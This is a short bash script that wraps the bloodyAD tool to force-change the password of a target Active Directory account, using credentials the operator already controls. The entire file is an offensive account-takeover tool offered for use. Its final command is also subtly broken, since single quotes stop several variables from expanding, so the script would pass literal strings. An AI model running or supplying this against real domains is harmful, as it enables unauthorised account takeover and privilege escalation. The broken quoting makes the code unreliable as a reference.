#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"

echo -e "${BOLD}${RED}wow ! Force Changed Password  ---<${RESET}"

echo "full Domain name:- "
read full_domain

echo "Domain:- "
read domain

echo "controled Username:- "
read username

echo "controled Password:- "
read password

echo "target account:- "
read target_ac

echo "set New password:- "
read new_pass

bloodyAD --host $full_domain -d $domain -k -u '$username' -p '$password' set password $target_ac '$new_pass'  
